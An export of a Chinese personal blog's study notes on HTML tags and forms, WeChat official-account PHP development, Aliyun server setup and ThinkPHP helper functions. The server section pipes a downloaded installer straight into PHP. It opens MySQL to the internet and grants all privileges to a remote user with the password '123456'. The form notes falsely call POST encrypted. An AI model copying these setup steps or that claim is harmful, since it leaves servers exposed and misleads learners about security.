- `x<sup>2</sup>`         上标     x<sup>2</sup>
- `CO<sub>2</sub>`        下标    CO<sub>2</sub>

#### ⑥.原样输出

- `<pre> </pre>`              保持代码样式格式输出

### 5.列表标签

**场景**: 一排排 or 一列列长的差不多, 样式相似, 都可以用列表

- 有序列表ol（ordered list）

```有序列表
《回乡偶书》
	<ol>
		<li>瘦小离家老大回</li>
		<li>乡音未改肉成堆</li>
		<li>儿童相见不相识</li>
		<li>请问胖子你是谁</li>
	</ol>
```

- 无序列表ul（UNordered list）

```无序列表
《静夜思》
	<ul>
		<li>窗前明月光</li>
		<li>地上鞋两双</li>
		<li>一对狗男女</li>
		<li>其中就有你</li>
	</ul>
```

- 定义列表dl（defined list）

```定义列表
<dl>
		<dt>帮助中心</dt>
		<dd>账户管理</dd>
		<dd>购物指南</dd>
		<dd>订单操作</dd>
	</dl>
```

> 在实际开发中, ul 使用频率比较 ol 高, 原因是ul解析不用排序，速度比ol快一点 

### 6.实体符号

| 基本格式： | &符号代码； |      |
| :--------: | :---------: | :--: |
|    空格    |   &nbsp；   |      |
|    小于    |    &lt；    |  <   |
|    大于    |    &gt；    |  >   |
|    版权    |   &copy；   |  ©   |
|   人民币   |   &yen；    |  ¥   |

其余实体符号具体参考**实体符号速查表**

|  符号代码  |   释义   |   表现   |      |
| :--------: | :------: | :------: | :--: |
| `&hearts;` |   爱心   | &hearts; |      |
|  `&euro;`  |   欧元   |  &euro;  |      |
| `&frac25;` |   分数   | &frac25; |      |
|  `&uarr;`  | 向上箭头 |  &uarr;  |      |
|  `&larr;`  | 向左箭头 |  &larr;  |      |

### 7.超链接

- 标签名：a
- 属性：
  - href        链接地址
  - target     在制定窗口打开链接
    - _self 	在本窗口打开链接，默认
    - _blank      在新的空白页打开链接
    - _top         在顶级窗口打开链接
    - 自定义name窗口

**注意点：链接地址为协议+域名，若不写地址，则默认跳转到当前页面**

1. 任意一个地址只会对应一个文件

2. 在任意目录下，命名为 ***index.html*** 或者 ***index.php*** 的文件，访问该目录时会自动执行index文件。

3. URL：网址

   在完整地址中，第一个？是文件与参数的分隔符

4. 参数

   格式：参数名1="参数值1"  参数名1="参数值1"  

   > 多个参数之间有&隔开

5. 锚点

   格式：  #锚点名

   > 必须在锚点名前加#号

```地址
<a href="http://www.xxx.com:80/image/av/a.jpg?name=yuhan&age=18#xxoo"> 瞎编的完整地址 </a>
```

### 8.锚点

**作用**：跳转至某一页面或者某一节点

**步骤**：

​	1.确定锚点：HTML4	name="锚点名"

​        		       HTML5	id="锚点名"

​	2.跳转到锚点：

​		`<a href="url+#锚点名">点击跳转</a>`

**注意点：链接地址为协议+域名，若不写地址，则默认跳转到当前页面**

<a href="www.baidu.com">baidu</a>	]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML (基本02)</title>
    <url>/2017/09/27/html%20-02/</url>
    <content><![CDATA[
# 二.HTML (基本02)

## 1. 多媒体标签

### 1.图片标签

标签名：   **img**

属性：	

```属性
	src			图片来源地址	

	width	   	图片宽度调节

	height	  	图片高度调节

	title		鼠标悬停显示文本

	alt			图片加载失败替代文本 

```

**注意：**高度属性和宽度属性一般不同时使用，避免影响图片固有宽高比。

> 计算机常用长度单位：px （像素）

```代码
<img src="图片路径" width="20px" title="picture" alt="~"
```

### 2.音频标签

标签名：  **audio**

属性：

```属性
	src			音频来源路径
	controls	控制器
	loop		循环播放
	autoplay	自动播放

```

```代码
<audio src="音频路径" controls loop autoplay>音频播放异常
</audio>


```



媒介标签——**source**

```媒介标签
<audio controls>
	<source src="./music.mp3">
	<source src="./music.amv">
	<source src="./music.fac">
</audio>


```

> 媒介标签提供了一种可能：当所用浏览器不支持某种格式的音频时，有替代格式的同一音频可以正常播放。

### 3.视频标签

标签名：  **video**

属性：

```属性
	src 		视频来源地址
	controls	控制器
	weight		视频宽度
	height		视频高度
	loop  		循环播放
	autoplay	自动播放


```

```代码
<video src="视频地址" wieght="200" controls loop autoplay>


```

媒介标签——**source**

```媒介代码
<video controls>
	<source src="./video.mp4">
	<source src="./video.flv">
	<source src="./video.avi">
</video>


```

> 媒介标签提供了一种可能：当所用浏览器不支持某种格式的音频时，有替代格式的同一音频可以正常播放。

### 4.地址路径

计算机文件路径分为 **绝对路径** 和 **相对路径** 。

#### 相对路径

​	.			当前路径，默认

​	..		       上一级路径

```eg
<img src="1.jpg">
<img src="./1.jpg">
<!--以上均为在当前目录下寻找1.jpg文件-->

<img src="../1.jpg">
<img src="../../1.jpg">
<!--以上两个分别为在上层目录和上上层目录中寻找1.jpg-->



```

#### 绝对路径

盘符式：	x:/.../.../...

网址式：	http://.../.../...

根目录：	/.../.../...

> 此处的根目录，在wamp中代表www目录

```
<img src="D:/wamp/www/3.jpg">
<img src="http://localhost/3.jpg" width="300">
<img src="/3.jpg" width="300">



```



### 5.表单声明

> 表单---常用于和用户做交互

**标签名**：	**form**（表单声明标签）

**属性**：

```属性
	action			指定一个地址，将表单内容提交给服务器
					若属性值为空，则默认提交给自己
	
	method			指定页面内容传输方式；
		get			明文传输，为默认传输方式；
	   （查）		  速度快，但安全性较低；
					传输大小在http协议上没有限制，
					实际上受到浏览器限制,
					大多数<2KB = 2048 B；
					
		post		密文传输；
	  （增删改）	 	 速度相对get要慢，但安全性高；
					传输大小在http协议上没有限制，
					实际上受到服务器限制；
	
	enctype	= "multipart/form-date"
					专用于提交文件给服务器



```

**使用**

```实例
<form action="http://www.baidu.com/s" method="post">
	百度：<input type="text" name="word"><br/>
	密码：<input type="password" name="pwd"><br/>
		<input type="submit">
</form>



```

### 6.表单标签

- 标签名：	**input**
- 特殊属性：
  - **name**	给当前标签命名，只有命名之后，服务器才能知道接收的信息属于谁。一般情况下，所有的表单都需要name。
  - **value**         给当前标签赋予默认值，其中可手动输入标签，value值可写可不写，不可手动输入标签必须写入value值。
- 常用属性： 
  - **type**

```属性值
type属性值：
		text		文本域，默认
		password	密码域（输入不可见）
		radio		单选（配合name使用）
		checkbox	多选
		email		邮箱（确保输入"xxx@xxx"格式）
		number		数字（只能输入数字）
		url			地址（确保输入"xxx://xxx"格式）
		date		日期选择
		file		文件提交
		hidden		隐藏域
		search		搜索
		submit		提交
		button 		按钮（必须配合js使用）
		



```

```代码
<form action="./demo.php" method="post" enctype="multipart/form-date">
默认文本框：<input> <br>
用户名：<input type="text" name="userName" value="id"><br>
密码：<input type="password" name="psd"><br>
手机号：<input type="number" name="tel"><br>
性别：<input type="radio" name="sex" value="man">男
	<input type="radio" name="sex" value="female">女
	<br>
爱好:<input type="checkbox" name="hobby[]" value="book">book
	<input type="checkbox" name="hobby[]" value="sports">sports
	<input type="checkbox" name="hobby[]" value="game">game
	<input type="checkbox" name="hobby[]" value="bike">bike
	<br>
<!--checkbox要将name值后补上[]，才能形成真正的多选 -->

邮箱：<input type="email" name="email"><br>
生日:<input type="date" name="birthday"><br>
搜索：<input type="search" name="search"><br>
头像：<input type="file" name="icon"><br>

<!--上传文件的3个必要条件-->
<!--
	1.file表单必须要有name属性
	2.form表单的属性method=post
	3.form表单的属性enctype=multipart/form-date
-->

隐藏域：<input type="hidden" name="id" value="0328"><br>
URL:<input type="url" name="url"><br>
<input type="submit" value=""><br>
<!--默认为提交-->
按钮：<input type="button" value="insure">

</form>



```



> 其中由于默认文本框中标签未添加name属性，提交后无法查看相应内容，更改为`<input name="default">`后提交可正常显示



## 2. 表单

### 1.下拉框

#### 表单标签

**声明标签**：	*select*

​	属性：	name

**字内容标签**：	*option*

​	属性：value

> option标签若没有value值则会将正文内容提交给服务器

```代码
户籍：
	<select name="address">
		<option>choice</option>
		<option value="1">shanghai</option>
		<option value="2">zhejiang</option>
		<option value="3">jiangsu</option>
		<option value="4">shadong</option>
		<option value="5">hunan</option>
		<option value="6">hubei</option>
		<option value="7">jiangxi</option>
	</select>


```

![](D:/wamp/www/XIA/0329/%E4%BA%8C%E7%BB%84%E4%BD%9C%E4%B8%9A0329/%E5%BC%A0%E4%BB%A4%E5%B8%9B/md%E6%95%B4%E7%90%86/1555.jpg)

### 2.快捷键

快捷键：	

```快捷键
快捷键：	
		ctrl + c   			光标只要在当前行即可
		ctrl + v			马上在上一行进行粘贴

		ctrl + shift + d	复制当前行到下一行

		ctrl + x			删除（本质为剪切）

		ctrl + alt + 方向键		快速选中 同列光标

		ctrl + /			快速注释


		emmet插件快速编写类似html标签：

		$ 		索引， 本质就是数字，默认从1开始
		
		$@num 	索引， 默认从num开始计数

		*		乘以几次，重复几次，出现几个标签
		
		[]		属性  [属性名=属性值]

		{} 		正文内容


```

实例

```
<select name="test">	
	<!-- option{$}*5 -->
	<option value="">1</option>
	<option value="">2</option>
	<option value="">3</option>
	<option value="">4</option>
	<option value="">5</option>
	
	<!-- option[value=$]*5 -->
	<option value="1"></option>
	<option value="2"></option>
	<option value="3"></option>
	<option value="4"></option>
	<option value="5"></option>
	
	<!-- option[value=$]{$@1990}*5 -->
	<option value="1">1990</option>
	<option value="2">1991</option>
	<option value="3">1992</option>
	<option value="4">1993</option>
	<option value="5">1994</option>
</select>


```

### 3.多文本域

**标签名**：	texterea

​     **属性**:	  rows ——  行

​			cols   ——  列

> 之前input，select 默认值都是value
> textarea 的默认值是正文内容，而非value

`<textarea rows="5" cols="50"></textarea>`

### 4.button标签

```
<form action="">
	 	<input type="text" name="userName">
	 	<button> button按钮</button>
	 	<input type="submit">
</form>


```

form表单中的独立button按钮，默认值也是正文内容

默认效果是将表单内容提交给服务器（同type-submit）

后期更多是配合js，实现更多的效果。

**注意：不同于input标签下的type属性值**

`<input type="button" value="提交">`

### 5.表单常用属性

常见属性：

```属性
	placeholder			背景虚化字
	minlength			输入值最小长度
	maxlength			输入值最大长度
	autofocus			自动获取光标
	autocomplete		自动提示历史记录
		——  on		开启，默认
		——  off		关闭
	required			输入不能为空
	checked				单选/复选默认勾选项
	selected			下拉框默认显示项
	readonly			只读，只能看不能改，提交给服务器
	disabled			禁用，只能看不能改，不能提交给服务器
	multiple			开启多选选项


```

### 6.头标签设置

```
	<!-- 1.设置编码 <meta charset="UTF-8"> -->
	<meta charset="UTF-8">

	<!-- 2.设置标题 <title></title> -->
	<title>head标签</title>

	<!-- 3.搜索引擎关键字 -->
	<meta name="keywords" content="keyword1,keyword2,...">

	<!-- 4.设置描述 -->
	<meta name="description" content="描述内容">

	<!-- 5.网页重定向 -->
	<!-- <meta http-equiv="refresh" content="3;url=./041.html" -->
	
	<!-- 6.导入css -->
	<link rel="stylesheet" href="./demo.css">

	<!-- 7.导入js -->
	<script src="./demo.js"></script>

	<!-- 8.导入icon图标 -->
	<link rel="icon" href="favicon.ico">


```

### 7.表格

表格声明：		table

表格标题：		caption

​	表行：		tr		table row

​	表头：		th		table head

表格描述：		td		table description

> 设计：先看行，再看列



属性：

```属性
	border				边框宽度
    cellspacing			外边距（单元格之间的距离）
    cellpadding			内边距（单元格与内容之间的距离）
    width				表格宽度
    height				表格高度
    colspan				列合并
    rowspan				行合并
    align				水平对齐：（left/center/right）
    valign（vertical）   垂直对齐：（top/middle/bottom）
    bgcolor				背景颜色
    background			背景图片


```



### 8.下拉框

## 表单标签

**声明标签**：	*select*

​	属性：	name

**字内容标签**：	*option*

​	属性：value

> option标签若没有value值则会将正文内容提交给服务器

```代码
户籍：
	<select name="address">
		<option>choice</option>
		<option value="1">shanghai</option>
		<option value="2">zhejiang</option>
		<option value="3">jiangsu</option>
		<option value="4">shadong</option>
		<option value="5">hunan</option>
		<option value="6">hubei</option>
		<option value="7">jiangxi</option>
	</select>


```

![](D:/wamp/www/XIA/0329/%E4%BA%8C%E7%BB%84%E4%BD%9C%E4%B8%9A0329/%E5%BC%A0%E4%BB%A4%E5%B8%9B/md%E6%95%B4%E7%90%86/1555.jpg)

### 9.快捷键

快捷键：	

```快捷键
快捷键：	
		ctrl + c   			光标只要在当前行即可
		ctrl + v			马上在上一行进行粘贴

		ctrl + shift + d	复制当前行到下一行

		ctrl + x			删除（本质为剪切）

		ctrl + alt + 方向键		快速选中 同列光标

		ctrl + /			快速注释


		emmet插件快速编写类似html标签：

		$ 		索引， 本质就是数字，默认从1开始
		
		$@num 	索引， 默认从num开始计数

		*		乘以几次，重复几次，出现几个标签
		
		[]		属性  [属性名=属性值]

		{} 		正文内容


```

实例

```
<select name="test">	
	<!-- option{$}*5 -->
	<option value="">1</option>
	<option value="">2</option>
	<option value="">3</option>
	<option value="">4</option>
	<option value="">5</option>
	
	<!-- option[value=$]*5 -->
	<option value="1"></option>
	<option value="2"></option>
	<option value="3"></option>
	<option value="4"></option>
	<option value="5"></option>
	
	<!-- option[value=$]{$@1990}*5 -->
	<option value="1">1990</option>
	<option value="2">1991</option>
	<option value="3">1992</option>
	<option value="4">1993</option>
	<option value="5">1994</option>
</select>


```

### 10.多文本域

**标签名**：	texterea

​     **属性**:	  rows ——  行

​			cols   ——  列

> 之前input，select 默认值都是value
> textarea 的默认值是正文内容，而非value

`<textarea rows="5" cols="50"></textarea>`

### 11.button标签

```
<form action="">
	 	<input type="text" name="userName">
	 	<button> button按钮</button>
	 	<input type="submit">
</form>


```

form表单中的独立button按钮，默认值也是正文内容

默认效果是将表单内容提交给服务器（同type-submit）

后期更多是配合js，实现更多的效果。

**注意：不同于input标签下的type属性值**

`<input type="button" value="提交">`

### 12.表单常用属性

常见属性：

```属性
	placeholder			背景虚化字
	minlength			输入值最小长度
	maxlength			输入值最大长度
	autofocus			自动获取光标
	autocomplete		自动提示历史记录
		——  on		开启，默认
		——  off		关闭
	required			输入不能为空
	checked				单选/复选默认勾选项
	selected			下拉框默认显示项
	readonly			只读，只能看不能改，提交给服务器
	disabled			禁用，只能看不能改，不能提交给服务器
	multiple			开启多选选项


```



### 13.头标签设置

```
	<!-- 1.设置编码 <meta charset="UTF-8"> -->
	<meta charset="UTF-8">

	<!-- 2.设置标题 <title></title> -->
	<title>head标签</title>

	<!-- 3.搜索引擎关键字 -->
	<meta name="keywords" content="keyword1,keyword2,...">

	<!-- 4.设置描述 -->
	<meta name="description" content="描述内容">

	<!-- 5.网页重定向 -->
	<!-- <meta http-equiv="refresh" content="3;url=./041.html" -->
	
	<!-- 6.导入css -->
	<link rel="stylesheet" href="./demo.css">

	<!-- 7.导入js -->
	<script src="./demo.js"></script>

	<!-- 8.导入icon图标 -->
	<link rel="icon" href="favicon.ico">


```

### 14.表格

表格声明：		table

表格标题：		caption

​	表行：		tr		table row

​	表头：		th		table head

表格描述：		td		table description

> 设计：先看行，再看列



属性：

```属性
	border				边框宽度
    cellspacing			外边距（单元格之间的距离）
    cellpadding			内边距（单元格与内容之间的距离）
    width				表格宽度
    height				表格高度
    colspan				列合并
    rowspan				行合并
    align				水平对齐：（left/center/right）
    valign（vertical）   垂直对齐：（top/middle/bottom）
    bgcolor				背景颜色
    background			背景图片


```



## 3. 布局

### 1.大分帧

> 大分帧：**frameset** 

> （在 **html5** 中已经淘汰，但很多较老的网页还在用大分帧布局）

> （**frameset** 与 **body** 标签不能共存）

**标签名**： frameset       	设置窗口（分帧）

**格式**：

```frameset格式
<frameset rows="x%,x%">			<frameset col="x%,x%">
	<frame>							<frame>
	<frame>							<frame>
</frameset>						</frameset>

<!--可以嵌套使用，嵌套时，将下次要分频的frame标签替换为frameset-->


```

**属性**： 	rows		行分

​			     cols		 列分

​				*		   剩余空间

​			     noresize	 固定分频区域

​			     frameborder  分频边框关闭(=0)或开启(非0)



**子标签名**： frame		窗口（分帧）

**属性**：	src			窗口内容来源地址

​			   name		   给当前窗口命名

​			   scrolling	       设置滚动条启用(=yes)或禁用(=no)



```代码实例
<!-- 设置上，下（左，右）分频，并自定义内容-->
<frameset rows="10%,90%" noresize frameborder="1">
	<frame src="./topPage.jpg" name="top" scrolling="no">
	<frameset cols="20%,*">
		<frame src="xxx.html" name="left" scrolling="no">
		<frame src="xxx.html" name="right">
	</frameset>
</frameset>	


```

### 2.小分帧

**标签名**： iframe

**属性** ：   scrolling		滚动条（yes/no）

​		src			 引用来源

​		width		    小分帧宽度

​		height		   小分帧高度

​		frameborder	小分帧边框显示（0/非0）

​		name		     给小分帧命名

**格式**：

```格式
<iframe src="广告来源地址" scrolling="no" width="500" height="200" frameborder="no">
</iframe>


```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>微信开发</title>
    <url>/2018/09/23/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[
### 微信开发

**前提**: 

​	一台云服务器

**分类:**

服务号 | 订阅号 | ~~企业号~~ | 小程序(Vuejs封装)

​	订阅号 --账号主体:个人(仅仅文章,发说说)(推送一天一条消息)

​				 --账号主体:公司

​	服务号 --单独一个聊天框 , 不在订阅号标签内(推送一个月四条)

​	企业号 --内部管理沟通的平台

**两个接口**

​	微信支付接口 , 微信登录接口



**后台**: mp.weixin.qq.com



**开发：** 

百度搜索

微信开放平台    微信登陆相关接口

微信公众平台	微信开发

​	认证 - 300/年

​	微信测试号（不认证测试开发）(一年有效期)

**功能：**

​	1.自定义菜单

​	2.自动回复

 	3.展示页面

**高级接口**:

​	语音识别: 微信对外开放了语音识别的接口

​	客服接口: 可在12小时内持续对发消息用户沟通

​	网页授权: 可使用qq,微信登录

​	生成参数二维码: 分析用于来源或用户绑定

​	获取用户基本信息: openid 获取用户头像,名称,性别等

​	获取关注者列表: 获取所有关注者

​	用户分组接口: 为关注者分组

​	上传下载文件: 可将内容在自己的服务器中上传下载

**环境搭建**

​	打通自己的云服务器和微信接口平台的通道

​	token:可以表明自己身份的令牌(同一个服务器同时支持多个微信平台)

​	为保障安全,使用的是https协议

**第三方网络服务:**

​	百度bae , 新浪sae , 腾讯云 , 各种**云服务器** , 租用虚拟主机 , 自己传服务器

​	应用引擎(一键创建应用环境)

​	版本控制(SVN/Git)

**测试号管理：**

​	测试号信息：id+pass

​	接口配置: 服务器url + 令牌验证token

**PHP编辑开发:**

```
数据交换:  
	get/post使用的是XML/json格式
	xml优势:既可以存数据,又可以存格式;可做数据交换(各种语言均可以解析)
	PHP函数: 
		simplexml_load_string() 函数
		作用: 将XML数据转成PHP对象 
	simplexml_load_string('xml字符串','对象名','参数')
	simlpexml_load_string($str,'SimpleXMLElement',LIBXML_NOCDATA)
	--第三个参数为了解析传过来的xml对象数据,全部是包裹在<!CDATA[]>中

```

```
信息格式(msgtype):
	文本--text
	语音--voice
	视频--video
	图片--image
	位置--location
	链接--link
	
```



```
1.上传接口代码到自己的服务器
代码:
	定义了tokenchangliang
	将三个参数字典排序拼接为一个字符串,sha1加密,之后与第四个参数对比
	返回结果给请求方
2.完成接口配置
3.消息管理

```

客服消息

php curl (在PHP中模拟浏览器发起http请求--get/post)

手册--聚合代码 代码:**curl**_setopt方法

```
function https_request(url,data=null)
{
	//初始化
	//判断get/post
	//执行
}
用处:模拟登陆|爬取数据
//获取access_token(全局唯一接口调用凭据)
$turl = '';()接口文档模板
$tres = https_request($turl);

//提取返回的json数据
$data = json_decode($tres,true);
$access_token = $data['access_token'];

客服发消息接口
$url = '';
$data={
	'touser':'OPENID',
	'msgtype':'text',
	'text':{
		'content':'内容'
	}
}
$res=https_request($url,$data);
```

> API数据:聚合科技(www.juhe.cn)

模板消息

```
1.设置模板
    {{first.DATA}}
    商品名:{{keword1.DATA}}
    价格:{{keword2.DATA}}
    订单日期:{{keword3.DATA}}
    {{remark.DATA}}
2.修改模板程序,填写参数
```

自定义菜单

3个以及菜单 , 每个一级菜单最多包含5个二级菜单 , 4 - 7 个汉字

点击事件: click 

跳转url: view  

扫码: scancode_push scancode_waitmsg

发送图片: pic_sysphoto

拍照/本地发送: pic_phpoto_or_album

pic_weixin

弹出地理位置: location_select

发送消息: media_id

跳转图文消息: view_limited

作业:

聚合->查快递, 天气

token 提取出来



## ps:代码资料

1.验证token

```
//define your token
define("TOKEN", "s86");  // 定义常量
$wechatObj = new wechatCallbackapiTest();
$wechatObj->valid();

class wechatCallbackapiTest
{
	public function valid()
    {
        $echoStr = $_GET["echostr"];

        //valid signature , option
        if($this->checkSignature()){
        	echo $echoStr;
        	exit;
        }
    }

    public function responseMsg()
    {
		//get post data, May be due to the different environments
		$postStr = $GLOBALS["HTTP_RAW_POST_DATA"];

      	//extract post data
		if (!empty($postStr)){
                /* libxml_disable_entity_loader is to prevent XML eXternal Entity Injection,
                   the best way is to check the validity of xml by yourself */
                libxml_disable_entity_loader(true); // xml 保护模式开启
              	$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);
                $fromUsername = $postObj->FromUserName;
                $toUsername = $postObj->ToUserName;
                $keyword = trim($postObj->Content);
                $time = time();
                $textTpl = "<xml>
							<ToUserName><![CDATA[%s]]></ToUserName>
							<FromUserName><![CDATA[%s]]></FromUserName>
							<CreateTime>%s</CreateTime>
							<MsgType><![CDATA[%s]]></MsgType>
							<Content><![CDATA[%s]]></Content>
							<FuncFlag>0</FuncFlag>
							</xml>";             
				if(!empty( $keyword ))
                {
              		$msgType = "text";
                	$contentStr = "Welcome to wechat world!";
                	$resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);
                	echo $resultStr;
                }else{
                	echo "Input something...";
                }

        }else {
        	echo "";
        	exit;
        }
    }
		
	private function checkSignature()
	{
        // you must define TOKEN by yourself
        if (!defined("TOKEN")) {
            throw new Exception('TOKEN is not defined!');
        }
        
        $signature = $_GET["signature"];
        $timestamp = $_GET["timestamp"];
        $nonce = $_GET["nonce"];
        		
        $token = TOKEN;

        // 加密/校验流程如下：

// 1）将token、timestamp、nonce三个参数进行字典序排序 
// 2）将三个参数字符串拼接成一个字符串进行sha1加密 
// 3）开发者获得加密后的字符串可与signature对比，标识该请求来源于微信
		$tmpArr = array($token, $timestamp, $nonce);
        // use SORT_STRING rule
		sort($tmpArr, SORT_STRING);
		$tmpStr = implode( $tmpArr );
		$tmpStr = sha1( $tmpStr );
		
		if( $tmpStr == $signature ){
			return true;
		}else{
			return false;
		}
	}
}
```

2.接受数据/回复数据

```
// 全局接收 psot数据  一般情况 禁用 因为不安全
// $postStr = $GLOBALS["HTTP_RAW_POST_DATA"];

// 使用 php://input
$postStr = file_get_contents('php://input');

// 把微信请求到的数据   poststr
// 存入文件
file_put_contents('./s.txt', $postStr);

libxml_disable_entity_loader(true); // xml 保护模式开启
// 把xml 转为对象
$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);
$fromUsername = $postObj->FromUserName;   // 用户id
$toUsername = $postObj->ToUserName;             // 商户id
$keyword = trim($postObj->Content);   // 内容
$time = time();


// 根据用户 不同的点击菜单 进行不同的回复
// 是事件
// 判断是 哪一个key

$evevnt = $postObj->Event;
$eventKey = $postObj->EventKey;

if ( $event == 'CLICK' ) {
  switch (variable) {
    case 'value':
      # code...
      break;
    
    default:
      # code...
      break;
  }

  echo $tpl;
}
```



微信开发原理

![1566817418172](/images/imgs/1566817418172.png)



环境搭建 : 

​	- 服务器

​	sae(新浪云应用) - 权限受限

​	bae(百度云应用)

​	-虚拟主机+域名解析(Apache-.vhost/Nginx-whereis nginx)

​	sftp(sublime插件 , 服务器即时代码变化)

日志记录:

​	1. 查看服务器传入内容 - wwwlog

2. 创建日志记录 file_put_content('log.txt',$str);

   动态查看日志`tail -F log.txt`	]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>微信开发</tag>
      </tags>
  </entry>
  <entry>
    <title>五分钟配置好一台阿里云服务器</title>
    <url>/2018/10/27/%E4%BA%94%E5%88%86%E9%92%9F%E9%85%8D%E7%BD%AE%E5%A5%BD%E4%B8%80%E5%8F%B0%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[
## 准备工作

购买阿里云服务器 , 使用`微柳lamp`安装环境, 选择centos6.9/php7.0

向浏览器输入IP地址 , 即可查看到微柳首页

## 配置

`cd oneinstack/` 进入文件目录

`./change_php_version.sh ` 执行修改PHP版本, 选择7.0

### mysql配置

`./reset_db_root_password.sh ` 执行修改mysql默认密码

`iptables -nvL` 查看防火墙安全配置

`iptables -I INPUT 4 -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT` 打开3306端口

`service iptables save` 保存防火墙配置

`mysql -u root -p` 进入mysql环境

`grant all privileges on *.* to NI9NE@'%' identified by '123456';` 添加mysql数据库控制用户

`flush privileges;` 刷新权限

`exit` 退出mysql

使用Navicat使用非root账户登录云服务器数据库

### 安装composer

`curl -sS https://getcomposer.org/installer | php` 

`mv composer.phar /usr/local/bin/composer ` 

`composer self-update` 

`composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/` 使用阿里云源

`composer config -g -l `  查看全局配置

### 安装tp5

`cd /data/wwwroot/default/` 移动到默认页面地址

`composer create-project topthink/think=5.0.* tp5  --prefer-dist` 安装tp5项目文件夹

### 同步本地和云端代码

#### 配置服务器Git环境

`git config --global user.name "NI9NE" ` 配置全局变量

`git config --global user.email "ni9ne@outlook.com"` 

`git config -l` 检查是否设置完成

`cd ~/.ssh/` 进入公钥文件夹

`ssh-keygen -t rsa -C "ni9ne@outlook.com"` 生成公钥

`cat id_rsa.pub ` 查看并复制公钥, 并添加到github账号中

`ssh -T git@github.com` 检测是否链接成功

#### 提交到Git

`git init` 初始化

`git remote add origin git@github.com:NI9NE/thinkphp5.git` 链接仓库分支

`git remote -v` 查看链接情况

`git add . ` 

`git commit -m "部署tp5"`

`git push origin master`

#### 下拉代码到本地端

在本地环境目录打开cmd 

`git clone git@github.com:NI9NE/thinkphp5.git tp5` 

 `cd tp5` 

`composer install` 安装依赖

> thinkphp由于被添加进ignore目录,所以没有在git中上传 , 也无法拉到本地, 所以需要重新安装依赖

### 配置虚拟主机]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>框架开发</tag>
        <tag>云服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>框架开发 TP5-助手函数</title>
    <url>/2018/10/21/%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%91%20TP5-%E5%8A%A9%E6%89%8B%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[
### ThinkPHP helper函数

| 函数            | 功能                                                         | 参数                                                         | 返回值                                       |
| --------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | -------------------------------------------- |
| import()        | 导入所需要的类库                                             | 类库命名空间字符串(`$class`),起始路径`$$baseURL`,导入文件扩展`$ext` | bool值                                       |
| load_trait()    | 快速导入trait                                                | trait库`$class`,类库扩展名`$ext`                             | bool值                                       |
| exception()     | 抛出异常                                                     | 异常消息`$msg`,异常代码`$code`=0,异常类`$exception`          | 异常对象                                     |
| debug()         | 记录时间(微秒)和内存使用情况                                 | 开始标签`$start`,结束标签`$end`,小数位`$dec`(等于m代表统计内存占用) | 混合数据                                     |
| lang()          | 获取语言变量值                                               | 语言变量名`$name`,动态变量值`$vars`=[],语言`$lang`=''        | 混合数据                                     |
| config()        | 获取和设置配置参数                                           | 参数名`$name`='',参数值`$value`=null,作用域`$range`=''       | 混合数据                                     |
| input()         | 获取输入数据,支持默认值和过滤                                | 获取的变量名`$key`='',默认值`$default`=null,过滤方法`$filter`='' | 混合数据                                     |
| widget()        | 渲染输出                                                     | widget名称`$name`,传入的参数`$data`=[]                       | 混合数据                                     |
| model()         | 实例化                                                       | Model名称`$name`='',业务层名称`$layer`='model',是否添加类名后缀`$appendSuffix`=false | \think\Model                                 |
| validate()      | 实例化验证器                                                 | 验证器名称`$name`='',业务层名称`$layer`='validate',是否添加类名后缀`$appendSuuffix`=false | \think\Validate                              |
| db()            | 实例化数据库                                                 | 操作的数据表名称(不含前缀)`$name`='',数据库配置参数`$config`=[],是否强制重新连接`$force`=false | \think\db\Query                              |
| controller()    | 实例化控制器                                                 | 资源地址`$name`,控制层名称`$layer`='controller',是否添加类名后缀`$appendSuffix`=false | \think\Controller                            |
| action()        | 调用模块的操作方法                                           | 调用地址`$url`,调用参数(数组/字符串)`$vars`=[],要调用的控制层名称`$layer`='controller',是否添加类名后缀`$appendSuffix`=false | 混合数据                                     |
| vendor()        | 快速导入第三方框架类库,多有第三方框架的类库文件统一放到系统的vendor目录下 | 类库`$class`,类库后缀`$ext`=EXT                              | bool值                                       |
| dump()          | 浏览器良好的变量输出                                         | 变量`$var`,是否输出`$echo`=true,标签`$label`=null            | void\|string                                 |
| url()           | 生成url                                                      | 路由地址`$url`='',变量`$vars`='',生成的URL后缀`$suffix`=true,域名`$domain`=false | url字符串                                    |
| session()       | Session管理                                                  | session名称`$name`(如果为数组表示进行session设置),session值`$value`='',前缀`$prefix`=null | 混合数据                                     |
| cookie()        | Cookie管理                                                   | cookie名称`$name`(如果为数组表示进行cookie设置),cookie值`$value`='',参数`$option`=null | 混合数据                                     |
| cache()         | 缓存管理                                                     | 缓存名称`$name`(如果为数组表示进行缓存设置),缓存值`$value`='',缓存参数`$option`=null,缓存标签`$tag`=null | 混合数据                                     |
| trace()         | 记录日志信息                                                 | log信息(支持字符串和数组)`$log`='[think]',日志级别`$level`='log' | void\|array                                  |
| request()       | 获取当前Request对象实例                                      | 输出数据`$data`=[],状态码`$code`=200,头信息`$header`=[],类型`$type`='html' | Response                                     |
| view()          | 渲染模板输出                                                 | 模板文件`$template`='',模板变量`$var`=[],模板替换`replace`=[],状态码`$code`=200 | \think\response\View                         |
| json()          | 获取\think\response\Json对象实例                             | 返回的数据`$data`=[],状态码`$code`=200,头部`$header`=[],参数`$options`=[] | \think\response\Json                         |
